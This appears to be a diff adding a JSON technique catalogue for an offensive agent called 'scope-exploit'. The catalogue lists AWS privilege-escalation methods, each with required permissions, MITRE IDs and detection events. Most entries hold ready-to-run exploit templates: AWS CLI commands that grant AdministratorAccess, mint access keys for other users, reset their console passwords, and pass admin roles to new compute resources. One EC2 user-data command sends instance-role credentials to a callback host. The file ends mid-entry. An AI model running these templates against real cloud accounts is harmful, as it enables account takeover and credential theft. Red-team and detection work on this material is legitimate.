@@ -1,0 +1,1330 @@
+{
+  "version": "2026-04",
+  "description": "Consolidated technique seed knowledge for scope-exploit. Escalation, persistence, and post-exploitation vectors. Agent uses these as starting points for creative reasoning — not an exhaustive boundary.",
+  "escalation": {
+    "direct_iam": [
+      {
+        "id": "iam-create-policy-version",
+        "name": "iam:CreatePolicyVersion — Create admin policy version",
+        "category": "direct_iam",
+        "required_permissions": ["iam:CreatePolicyVersion"],
+        "permission_scope": "any managed policy attached to self or assumable role",
+        "exploit_template": "aws iam create-policy-version --policy-arn POLICY_ARN --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["CreatePolicyVersion"],
+        "severity_default": "critical",
+        "notes": "No PassRole needed. Creates a new version of an existing managed policy with Action:* Resource:* and sets it as the default version."
+      },
+      {
+        "id": "iam-set-default-policy-version",
+        "name": "iam:SetDefaultPolicyVersion — Revert to less-restricted version",
+        "category": "direct_iam",
+        "required_permissions": ["iam:SetDefaultPolicyVersion"],
+        "permission_scope": "any managed policy attached to self",
+        "exploit_template": "aws iam list-policy-versions --policy-arn POLICY_ARN && aws iam set-default-policy-version --policy-arn POLICY_ARN --version-id v1",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["SetDefaultPolicyVersion"],
+        "severity_default": "high",
+        "notes": "Organizations often have permissive v1 policies superseded by restrictive later versions. Set the default back to v1 to regain broad permissions."
+      },
+      {
+        "id": "iam-create-access-key",
+        "name": "iam:CreateAccessKey — Generate credentials for any user",
+        "category": "direct_iam",
+        "required_permissions": ["iam:CreateAccessKey"],
+        "permission_scope": "target user",
+        "exploit_template": "aws iam create-access-key --user-name TARGET_USER",
+        "mitre_techniques": ["T1098.001", "T1078.004"],
+        "detection_events": ["CreateAccessKey"],
+        "severity_default": "critical",
+        "notes": "Creates a new access key pair for any user, granting their full permissions. No PassRole needed."
+      },
+      {
+        "id": "iam-create-login-profile",
+        "name": "iam:CreateLoginProfile — Set console password",
+        "category": "direct_iam",
+        "required_permissions": ["iam:CreateLoginProfile"],
+        "permission_scope": "target user without existing console access",
+        "exploit_template": "aws iam create-login-profile --user-name TARGET_USER --password 'AttackerP@ss1' --no-password-reset-required",
+        "mitre_techniques": ["T1098", "T1078.004"],
+        "detection_events": ["CreateLoginProfile"],
+        "severity_default": "high",
+        "notes": "Precondition: target user must not already have console access. Creates a console login password for a user who does not already have one."
+      },
+      {
+        "id": "iam-update-login-profile",
+        "name": "iam:UpdateLoginProfile — Change console password",
+        "category": "direct_iam",
+        "required_permissions": ["iam:UpdateLoginProfile"],
+        "permission_scope": "target user",
+        "exploit_template": "aws iam update-login-profile --user-name TARGET_USER --password 'AttackerP@ss1' --no-password-reset-required",
+        "mitre_techniques": ["T1098", "T1078.004"],
+        "detection_events": ["UpdateLoginProfile"],
+        "severity_default": "high",
+        "notes": "Changes the console password for any user, locking out the legitimate user and granting console access to the attacker."
+      },
+      {
+        "id": "iam-attach-user-policy",
+        "name": "iam:AttachUserPolicy — Attach AdministratorAccess to self",
+        "category": "direct_iam",
+        "required_permissions": ["iam:AttachUserPolicy"],
+        "permission_scope": "self or target user",
+        "exploit_template": "aws iam attach-user-policy --user-name CURRENT_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["AttachUserPolicy"],
+        "severity_default": "critical",
+        "notes": "Attaches the AWS-managed AdministratorAccess policy directly to a user. Can be applied to self or target user."
+      },
+      {
+        "id": "iam-attach-group-policy",
+        "name": "iam:AttachGroupPolicy — Attach admin policy to group",
+        "category": "direct_iam",
+        "required_permissions": ["iam:AttachGroupPolicy"],
+        "permission_scope": "a group the attacker belongs to",
+        "exploit_template": "aws iam attach-group-policy --group-name MY_GROUP --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["AttachGroupPolicy"],
+        "severity_default": "critical",
+        "notes": "Attacker must be a member of the target group. Attaches AdministratorAccess to a group the attacker is a member of."
+      },
+      {
+        "id": "iam-attach-role-policy",
+        "name": "iam:AttachRolePolicy — Attach admin policy to assumable role",
+        "category": "direct_iam",
+        "required_permissions": ["iam:AttachRolePolicy"],
+        "permission_scope": "a role the attacker can assume",
+        "exploit_template": "aws iam attach-role-policy --role-name TARGET_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/TARGET_ROLE --role-session-name privesc",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["AttachRolePolicy", "AssumeRole"],
+        "severity_default": "critical",
+        "notes": "Attacker must be able to assume the target role. Attaches AdministratorAccess to the role, then assumes it."
+      },
+      {
+        "id": "iam-put-user-policy",
+        "name": "iam:PutUserPolicy — Create inline admin policy on self",
+        "category": "direct_iam",
+        "required_permissions": ["iam:PutUserPolicy"],
+        "permission_scope": "self or target user",
+        "exploit_template": "aws iam put-user-policy --user-name CURRENT_USER --policy-name privesc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["PutUserPolicy"],
+        "severity_default": "critical",
+        "notes": "Creates an inline policy with Action:* Resource:* directly on the user. Inline policy — no managed policy creation needed."
+      },
+      {
+        "id": "iam-put-group-policy",
+        "name": "iam:PutGroupPolicy — Create inline admin policy on group",
+        "category": "direct_iam",
+        "required_permissions": ["iam:PutGroupPolicy"],
+        "permission_scope": "a group the attacker belongs to",
+        "exploit_template": "aws iam put-group-policy --group-name MY_GROUP --policy-name privesc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["PutGroupPolicy"],
+        "severity_default": "critical",
+        "notes": "Creates an inline admin policy on the attacker's group. Attacker must be a member of the target group."
+      },
+      {
+        "id": "iam-put-role-policy",
+        "name": "iam:PutRolePolicy — Create inline admin policy on assumable role",
+        "category": "direct_iam",
+        "required_permissions": ["iam:PutRolePolicy"],
+        "permission_scope": "a role the attacker can assume",
+        "exploit_template": "aws iam put-role-policy --role-name TARGET_ROLE --policy-name privesc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["PutRolePolicy", "AssumeRole"],
+        "severity_default": "critical",
+        "notes": "Creates an inline admin policy on a role, then the attacker assumes it. Attacker must be able to assume the target role."
+      },
+      {
+        "id": "iam-add-user-to-group",
+        "name": "iam:AddUserToGroup — Add self to admin group",
+        "category": "direct_iam",
+        "required_permissions": ["iam:AddUserToGroup"],
+        "permission_scope": "target group",
+        "exploit_template": "aws iam add-user-to-group --user-name CURRENT_USER --group-name ADMIN_GROUP",
+        "mitre_techniques": ["T1098.003", "T1078.004"],
+        "detection_events": ["AddUserToGroup"],
+        "severity_default": "critical",
+        "notes": "Target group must have admin policies attached. Adds the attacker's user to a group that has admin-level policies."
+      },
+      {
+        "id": "iam-update-assume-role-policy",
+        "name": "iam:UpdateAssumeRolePolicy + sts:AssumeRole — Modify trust policy on privileged role",
+        "category": "direct_iam",
+        "required_permissions": ["iam:UpdateAssumeRolePolicy", "sts:AssumeRole"],
+        "permission_scope": "target high-privilege role",
+        "exploit_template": "aws iam update-assume-role-policy --role-name ADMIN_ROLE --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::ACCT:user/ATTACKER\"},\"Action\":\"sts:AssumeRole\"}]}' && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/ADMIN_ROLE --role-session-name privesc",
+        "mitre_techniques": ["T1548", "T1098.003", "T1078.004"],
+        "detection_events": ["UpdateAssumeRolePolicy", "AssumeRole"],
+        "severity_default": "critical",
+        "notes": "Two-permission combo: UpdateAssumeRolePolicy modifies the trust policy of a high-privilege role to trust the attacker, then AssumeRole is used to assume it."
+      },
+      {
+        "id": "iam-delete-permissions-boundary",
+        "name": "iam:DeleteUserPermissionsBoundary / iam:DeleteRolePermissionsBoundary — Remove boundary cap",
+        "category": "direct_iam",
+        "required_permissions": ["iam:DeleteUserPermissionsBoundary"],
+        "permission_scope": "target user or role with a permissions boundary set",
+        "exploit_template": "aws iam delete-user-permissions-boundary --user-name TARGET_USER",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["DeleteUserPermissionsBoundary", "DeleteRolePermissionsBoundary"],
+        "severity_default": "critical",
+        "notes": "Precondition: boundary must be set on target user or role. Removes the permissions boundary that caps the effective permissions, unlocking permissions previously restricted by the boundary. Also listed as standalone entry in boundary_bypass category."
+      },
+      {
+        "id": "iam-detach-policy",
+        "name": "iam:DetachUserPolicy / iam:DetachRolePolicy — Remove restricting policy",
+        "category": "direct_iam",
+        "required_permissions": ["iam:DetachUserPolicy"],
+        "permission_scope": "target user or role",
+        "exploit_template": "aws iam detach-user-policy --user-name TARGET_USER --policy-arn RESTRICTING_POLICY_ARN",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["DetachUserPolicy", "DetachRolePolicy"],
+        "severity_default": "high",
+        "notes": "Detaches a policy that was adding explicit deny statements or restrictions, widening the principal's effective permissions. Target may have a SCP-blocking or restricting managed policy that can be removed. Also listed as standalone entry in boundary_bypass category."
+      }
+    ],
+    "passrole": [
+      {
+        "id": "passrole-ec2-run-instances",
+        "name": "EC2 RunInstances — Pass admin role via instance profile",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "ec2:RunInstances"],
+        "permission_scope": "admin-level instance profile; role trust policy must allow ec2.amazonaws.com",
+        "exploit_template": "aws ec2 run-instances --image-id ami-xxx --instance-type t3.micro --iam-instance-profile Arn=ADMIN_PROFILE_ARN --user-data '#!/bin/bash\\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/creds && curl http://CALLBACK/exfil -d @/tmp/creds'",
+        "mitre_techniques": ["T1078.004", "T1548", "T1552.005"],
+        "detection_events": ["RunInstances"],
+        "severity_default": "critical",
+        "notes": "Pass an instance profile with admin role to a new EC2 instance, then access IMDS to retrieve role credentials via user data script."
+      },
+      {
+        "id": "passrole-lambda-create-invoke",
+        "name": "Lambda Create+Invoke",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
+        "permission_scope": "admin-level role whose trust policy allows lambda.amazonaws.com",
+        "exploit_template": "aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip && aws lambda invoke --function-name privesc output.json",
+        "mitre_techniques": ["T1078.004", "T1548", "T1098.001"],
+        "detection_events": ["CreateFunction20150331", "Invoke20150331v2"],
+        "severity_default": "critical",
+        "notes": "Chain: Create Lambda with admin execution role → invoke → function returns role credentials."
+      },
+      {
+        "id": "passrole-lambda-dynamodb-trigger",
+        "name": "Lambda via DynamoDB Trigger — No invoke permission needed",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "lambda:CreateFunction", "lambda:CreateEventSourceMapping"],
+        "permission_scope": "admin-level role whose trust policy allows lambda.amazonaws.com; DynamoDB stream ARN required",
+        "exploit_template": "aws lambda create-function --function-name privesc --role arn:aws:iam::ACCT:role/AdminRole --runtime python3.12 --handler index.handler --zip-file fileb://payload.zip && aws lambda create-event-source-mapping --function-name privesc --event-source-arn DDB_STREAM_ARN --starting-position LATEST",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateFunction20150331", "CreateEventSourceMapping"],
+        "severity_default": "critical",
+        "notes": "No invoke permission needed — function fires on DynamoDB write. Chain: Create function with admin role + DynamoDB trigger → no lambda:InvokeFunction needed, function fires on DynamoDB table write."
+      },
+      {
+        "id": "passrole-lambda-update-code",
+        "name": "Lambda Update Code (NO PassRole needed)",
+        "category": "passrole",
+        "required_permissions": ["lambda:UpdateFunctionCode"],
+        "permission_scope": "existing Lambda function with high-privilege execution role",
+        "exploit_template": "aws lambda update-function-code --function-name TARGET_FUNCTION --zip-file fileb://malicious.zip",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["UpdateFunctionCode20150331v2"],
+        "severity_default": "critical",
+        "notes": "NO PassRole needed — injects malicious code into existing function. The function's existing admin role is inherited. This is the most common escalation pattern in 2025."
+      },
+      {
+        "id": "passrole-lambda-update-config",
+        "name": "Lambda Update Config — Change execution role",
+        "category": "passrole",
+        "required_permissions": ["lambda:UpdateFunctionConfiguration", "iam:PassRole"],
+        "permission_scope": "existing Lambda function; admin role must allow lambda.amazonaws.com",
+        "exploit_template": "aws lambda update-function-configuration --function-name TARGET_FUNCTION --role arn:aws:iam::ACCT:role/AdminRole",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["UpdateFunctionConfiguration20150331v2"],
+        "severity_default": "critical",
+        "notes": "Changes an existing function's execution role to an admin role. Requires iam:PassRole on the admin role."
+      },
+      {
+        "id": "passrole-glue-dev-endpoint",
+        "name": "Glue Create/Update Dev Endpoint — SSH credential access",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "glue:CreateDevEndpoint"],
+        "permission_scope": "admin-level role whose trust policy allows glue.amazonaws.com",
+        "exploit_template": "aws glue create-dev-endpoint --endpoint-name privesc --role-arn arn:aws:iam::ACCT:role/AdminRole --public-key 'ssh-rsa ATTACKER_KEY'",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateDevEndpoint", "UpdateDevEndpoint"],
+        "severity_default": "critical",
+        "notes": "Chain: Create Glue dev endpoint with admin role → SSH in → environment has role credentials. Can also use glue:UpdateDevEndpoint on existing endpoint."
+      },
+      {
+        "id": "passrole-cloudformation-create-stack",
+        "name": "CloudFormation CreateStack — Service role creates IAM resources",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "cloudformation:CreateStack"],
+        "permission_scope": "admin-level CloudFormation service role",
+        "exploit_template": "aws cloudformation create-stack --stack-name privesc --template-body file://template.json --role-arn arn:aws:iam::ACCT:role/CFNAdminRole --capabilities CAPABILITY_IAM",
+        "mitre_techniques": ["T1078.004", "T1548", "T1136.003"],
+        "detection_events": ["CreateStack"],
+        "severity_default": "critical",
+        "notes": "Chain: Create CloudFormation stack using privileged service role → stack creates IAM resources (users, policies, roles) as the service role. Template must request CAPABILITY_IAM."
+      },
+      {
+        "id": "passrole-data-pipeline",
+        "name": "Data Pipeline — Run commands with admin role",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition"],
+        "permission_scope": "admin-level role whose trust policy allows datapipeline.amazonaws.com",
+        "exploit_template": "aws datapipeline create-pipeline --name privesc --unique-id privesc && aws datapipeline put-pipeline-definition --pipeline-id ID --pipeline-objects file://malicious-def.json",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreatePipeline", "PutPipelineDefinition"],
+        "severity_default": "critical",
+        "notes": "Chain: Create pipeline with admin role → pipeline runs commands with that role. Requires both CreatePipeline and PutPipelineDefinition permissions."
+      },
+      {
+        "id": "passrole-sagemaker-new-notebook",
+        "name": "SageMaker New Notebook — Create with admin role",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "sagemaker:CreateNotebookInstance", "sagemaker:CreatePresignedNotebookInstanceUrl"],
+        "permission_scope": "admin-level role whose trust policy allows sagemaker.amazonaws.com",
+        "exploit_template": "aws sagemaker create-notebook-instance --notebook-instance-name privesc --instance-type ml.t3.medium --role-arn arn:aws:iam::ACCT:role/AdminRole && aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateNotebookInstance", "CreatePresignedNotebookInstanceUrl"],
+        "severity_default": "critical",
+        "notes": "Chain: Create Jupyter notebook with admin role → access notebook UI → execute code with role credentials. Requires both creation and presigned URL generation."
+      },
+      {
+        "id": "passrole-sagemaker-existing-notebook",
+        "name": "SageMaker Existing Notebook (NO PassRole needed)",
+        "category": "passrole",
+        "required_permissions": ["sagemaker:CreatePresignedNotebookInstanceUrl"],
+        "permission_scope": "existing SageMaker notebook instance with high-privilege execution role",
+        "exploit_template": "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name TARGET_NOTEBOOK",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreatePresignedNotebookInstanceUrl"],
+        "severity_default": "critical",
+        "notes": "NO PassRole needed — get presigned URL to existing notebook with high-privilege role → execute code as its role. The notebook's existing admin role is inherited."
+      },
+      {
+        "id": "passrole-ecs-task-override",
+        "name": "ECS Task Override — Task role override to admin",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "ecs:RunTask"],
+        "permission_scope": "admin-level role whose trust policy allows ecs-tasks.amazonaws.com",
+        "exploit_template": "aws ecs run-task --cluster CLUSTER --task-definition TASKDEF --overrides '{\"taskRoleArn\":\"arn:aws:iam::ACCT:role/AdminRole\"}'",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["RunTask"],
+        "severity_default": "critical",
+        "notes": "Chain: Run ECS task with task role override to admin role. The task role override bypasses the task definition's original role."
+      },
+      {
+        "id": "passrole-bedrock-agentcore",
+        "name": "Bedrock AgentCore — Code interpreter with admin role",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "bedrock:CreateCodeInterpreter", "bedrock:InvokeCodeInterpreter"],
+        "permission_scope": "admin-level role whose trust policy allows bedrock.amazonaws.com",
+        "exploit_template": "aws bedrock create-code-interpreter --name privesc --role-arn arn:aws:iam::ACCT:role/AdminRole",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateCodeInterpreter", "InvokeCodeInterpreter"],
+        "severity_default": "critical",
+        "notes": "Chain: Create Bedrock code interpreter with admin role → execute arbitrary code that accesses role credentials. New attack surface as Bedrock AgentCore is adopted."
+      },
+      {
+        "id": "passrole-autoscaling-launch-config",
+        "name": "AutoScaling Launch Configuration — Instances inherit admin role",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "autoscaling:CreateLaunchConfiguration"],
+        "permission_scope": "admin-level instance profile",
+        "exploit_template": "aws autoscaling create-launch-configuration --launch-configuration-name privesc --image-id ami-xxx --instance-type t3.micro --iam-instance-profile ADMIN_PROFILE_ARN",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateLaunchConfiguration"],
+        "severity_default": "critical",
+        "notes": "Chain: Create launch config with admin instance profile → any instances launched from this config inherit the admin role via IMDS."
+      },
+      {
+        "id": "passrole-codestar-create-project",
+        "name": "CodeStar CreateProject — Creates IAM resources",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "codestar:CreateProject"],
+        "permission_scope": "CodeStar service role with admin access",
+        "exploit_template": "aws codestar create-project --name privesc --id privesc",
+        "mitre_techniques": ["T1078.004", "T1548", "T1136.003"],
+        "detection_events": ["CreateProject"],
+        "severity_default": "critical",
+        "notes": "Chain: CodeStar creates IAM resources using its service role → attacker gains admin via project role. CodeStar is deprecated but may still exist in older environments."
+      },
+      {
+        "id": "passrole-codebuild-create-start",
+        "name": "CodeBuild CreateProject + StartBuild (Method 41)",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "codebuild:CreateProject", "codebuild:StartBuild"],
+        "permission_scope": "admin-level CodeBuild service role",
+        "exploit_template": "aws codebuild create-project --name privesc --source '{\"type\":\"NO_SOURCE\",\"buildspec\":\"...\"}' --artifacts '{\"type\":\"NO_ARTIFACTS\"}' --environment '{\"type\":\"LINUX_CONTAINER\",\"image\":\"aws/codebuild/standard:7.0\",\"computeType\":\"BUILD_GENERAL1_SMALL\"}' --service-role arn:aws:iam::ACCT:role/AdminRole && aws codebuild start-build --project-name privesc",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateProject", "StartBuild"],
+        "severity_default": "critical",
+        "notes": "Chain: Create CodeBuild project with admin service role → start build → buildspec.yml runs arbitrary commands as the role. See also Method 15b (CodeBuild Buildspec Overwrite) in the novel_patterns category for the no-PassRole variant (id: new-codebuild-buildspec-overwrite)."
+      },
+      {
+        "id": "passrole-apprunner-create-service",
+        "name": "AppRunner CreateService (Method 42) — Container runs with admin role",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "apprunner:CreateService"],
+        "permission_scope": "admin-level instance role for App Runner",
+        "exploit_template": "aws apprunner create-service --service-name privesc --source-configuration '{\"ImageRepository\":{\"ImageIdentifier\":\"ATTACKER_IMAGE\",\"ImageRepositoryType\":\"ECR_PUBLIC\"}}' --instance-configuration '{\"InstanceRoleArn\":\"arn:aws:iam::ACCT:role/AdminRole\"}'",
+        "mitre_techniques": ["T1078.004", "T1548", "T1552.005"],
+        "detection_events": ["CreateService"],
+        "severity_default": "critical",
+        "notes": "Chain: Create App Runner service with admin instance role → container runs with role credentials accessible via IMDS."
+      },
+      {
+        "id": "passrole-ec2-spot-instances",
+        "name": "EC2 Spot Instances (Method 43) — Cheaper RunInstances variant",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "ec2:RequestSpotInstances"],
+        "permission_scope": "admin-level instance profile; role trust policy must allow ec2.amazonaws.com",
+        "exploit_template": "aws ec2 request-spot-instances --spot-price '0.05' --launch-specification '{\"ImageId\":\"ami-xxx\",\"InstanceType\":\"t3.micro\",\"IamInstanceProfile\":{\"Arn\":\"ADMIN_PROFILE_ARN\"},\"UserData\":\"BASE64_PAYLOAD\"}'",
+        "mitre_techniques": ["T1078.004", "T1548", "T1552.005"],
+        "detection_events": ["RequestSpotInstances"],
+        "severity_default": "critical",
+        "notes": "Same as EC2 RunInstances but uses spot instances — cheaper than RunInstances, same IMDS credential access pattern."
+      },
+      {
+        "id": "passrole-ecs-full-creation",
+        "name": "ECS Full Creation (Method 44) — Full stack creation",
+        "category": "passrole",
+        "required_permissions": ["iam:PassRole", "ecs:CreateCluster", "ecs:RegisterTaskDefinition", "ecs:CreateService"],
+        "permission_scope": "admin-level task role whose trust policy allows ecs-tasks.amazonaws.com",
+        "exploit_template": "aws ecs create-cluster --cluster-name privesc && aws ecs register-task-definition --family privesc --task-role-arn arn:aws:iam::ACCT:role/AdminRole --container-definitions '[{\"name\":\"privesc\",\"image\":\"ATTACKER_IMAGE\",\"essential\":true}]' && aws ecs run-task --cluster privesc --task-definition privesc",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateCluster", "RegisterTaskDefinition", "CreateService", "RunTask"],
+        "severity_default": "critical",
+        "notes": "Full stack: create cluster, task definition with admin task role, and service/task → container runs with admin credentials. Can use ecs:RunTask instead of ecs:CreateService."
+      },
+      {
+        "id": "passrole-lambda-add-permission-bypass",
+        "name": "Lambda AddPermission Bypass (Method 45) — Cross-account invoke",
+        "category": "passrole",
+        "required_permissions": ["lambda:AddPermission"],
+        "permission_scope": "Lambda function with admin execution role; attacker must be able to invoke from granted principal",
+        "exploit_template": "aws lambda add-permission --function-name TARGET_FUNCTION --statement-id privesc --action lambda:InvokeFunction --principal ATTACKER_ACCOUNT_ID",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["AddPermission20150331v2"],
+        "severity_default": "critical",
+        "notes": "Does NOT require iam:PassRole. Adds a resource-based policy allowing attacker-controlled principal to invoke the function → invoke from attacker account → exfiltrate execution role credentials. Cross-account invoke variant."
+      },
+      {
+        "id": "passrole-bedrock-agent-action-group",
+        "name": "Bedrock Agent Action Group Code Execution — Create agent with PassRole to Lambda",
+        "category": "passrole",
+        "required_permissions": ["bedrock:CreateAgent", "bedrock-agent:CreateAgentActionGroup", "lambda:CreateFunction", "iam:PassRole"],
+        "permission_scope": "IAM role with Lambda execution trust relationship that attacker can pass",
+        "exploit_template": "aws bedrock-agent create-agent --agent-name attacker-agent --agent-resource-role-arn AGENT_ROLE_ARN --foundation-model-id anthropic.claude-3-sonnet-20240229-v1:0 && aws lambda create-function --function-name attacker-fn --runtime python3.12 --role LAMBDA_EXEC_ROLE_ARN --handler index.handler --zip-file fileb://payload.zip && aws bedrock-agent create-agent-action-group --agent-id AGENT_ID --agent-version DRAFT --action-group-name exec --action-group-executor '{\"lambda\": \"LAMBDA_ARN\"}'",
+        "mitre_techniques": ["T1078.004", "T1548", "T1059"],
+        "detection_events": ["CreateAgent", "CreateAgentActionGroup", "CreateFunction"],
+        "severity_default": "high",
+        "notes": "Structurally identical to PassRole-to-Lambda (Method 17) but uses the Bedrock API surface — may bypass controls that restrict lambda:CreateFunction directly if bedrock:CreateAgent is less monitored. Alternative lower-permission sub-technique: bedrock-agent:UpdateAgentActionGroup on an existing agent can swap the Lambda function ARN to an attacker-controlled function without iam:PassRole (the function association is an update to the agent config, not a role assumption). If an existing Bedrock agent already exists with an action group, prefer the UpdateAgentActionGroup path. Check lambda.json for existing Lambda functions with privileged execution roles; cross-reference who has bedrock:CreateAgent or bedrock-agent:UpdateAgentActionGroup."
+      }
+    ],
+    "boundary_bypass": [
+      {
+        "id": "boundary-delete-user",
+        "name": "iam:DeleteUserPermissionsBoundary — Remove user boundary cap",
+        "category": "boundary_bypass",
+        "required_permissions": ["iam:DeleteUserPermissionsBoundary"],
+        "permission_scope": "target user with a permissions boundary set",
+        "exploit_template": "aws iam delete-user-permissions-boundary --user-name TARGET_USER",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["DeleteUserPermissionsBoundary"],
+        "severity_default": "critical",
+        "notes": "Precondition: boundary must be set on the target user. Removes the boundary, unlocking the full scope of the user's identity policies. This is the canonical standalone entry; direct_iam method 14 also references this technique."
+      },
+      {
+        "id": "boundary-delete-role",
+        "name": "iam:DeleteRolePermissionsBoundary — Remove role boundary cap",
+        "category": "boundary_bypass",
+        "required_permissions": ["iam:DeleteRolePermissionsBoundary"],
+        "permission_scope": "target role with a permissions boundary set",
+        "exploit_template": "aws iam delete-role-permissions-boundary --role-name TARGET_ROLE",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["DeleteRolePermissionsBoundary"],
+        "severity_default": "critical",
+        "notes": "Precondition: boundary must be set on the target role. Removes the boundary, unlocking the full scope of the role's identity policies. This is the canonical standalone entry; direct_iam method 14 also references this technique."
+      }
+    ],
+    "novel_patterns": [
+      {
+        "id": "novel-ssm-run-command",
+        "name": "SSM Run Command Escalation — Execute as instance profile",
+        "category": "novel_patterns",
+        "required_permissions": ["ssm:SendCommand"],
+        "permission_scope": "SSM-managed instances with high-privilege instance profiles",
+        "exploit_template": "aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters 'commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"]'",
+        "mitre_techniques": ["T1078.004", "T1548", "T1552.005"],
+        "detection_events": ["SendCommand"],
+        "severity_default": "critical",
+        "notes": "Look for ssm:SendCommand permission on instances with high-privilege instance profiles. Chain: Send command to SSM-managed instance → command executes as the instance's IAM role → exfiltrate role credentials or perform actions directly. Missed by static tools like PMapper."
+      },
+      {
+        "id": "novel-lambda-layer-injection",
+        "name": "Lambda Layer Injection — Override runtime libraries",
+        "category": "novel_patterns",
+        "required_permissions": ["lambda:UpdateFunctionConfiguration"],
+        "permission_scope": "Lambda function with admin execution role; attacker controls a Lambda layer",
+        "exploit_template": "aws lambda update-function-configuration --function-name TARGET --layers arn:aws:lambda:REGION:ATTACKER_ACCT:layer:malicious:1",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["UpdateFunctionConfiguration20150331v2"],
+        "severity_default": "critical",
+        "notes": "Look for lambda:UpdateFunctionConfiguration on a function with admin role. Attach malicious Lambda layer that overrides boto3 or runtime libraries → next invocation of the function executes attacker code with the function's role."
+      },
+      {
+        "id": "novel-ecs-fargate-task-injection",
+        "name": "ECS Fargate Task Injection — Sidecar container exfiltration",
+        "category": "novel_patterns",
+        "required_permissions": ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
+        "permission_scope": "ECS service with privileged task role",
+        "exploit_template": "aws ecs register-task-definition --family TARGET_SERVICE --task-role-arn EXISTING_ADMIN_ROLE --container-definitions '[{\"name\":\"legit\",...},{\"name\":\"sidecar\",\"image\":\"ATTACKER_IMAGE\"}]' && aws ecs update-service --cluster CLUSTER --service SERVICE --task-definition NEW_REVISION",
+        "mitre_techniques": ["T1078.004", "T1613"],
+        "detection_events": ["RegisterTaskDefinition", "UpdateService"],
+        "severity_default": "critical",
+        "notes": "Look for ecs:RegisterTaskDefinition + ecs:UpdateService on a service with privileged task role. Register new task definition revision with additional sidecar container that exfiltrates credentials → update service to use new revision."
+      },
+      {
+        "id": "novel-secrets-rds-ec2-pivot",
+        "name": "Secrets Manager -> RDS -> EC2 Pivot Chain",
+        "category": "novel_patterns",
+        "required_permissions": ["secretsmanager:GetSecretValue"],
+        "permission_scope": "database credential secrets + network path from caller to RDS",
+        "exploit_template": "aws secretsmanager get-secret-value --secret-id DB_CREDENTIAL_SECRET",
+        "mitre_techniques": ["T1552", "T1530"],
+        "detection_events": ["GetSecretValue"],
+        "severity_default": "high",
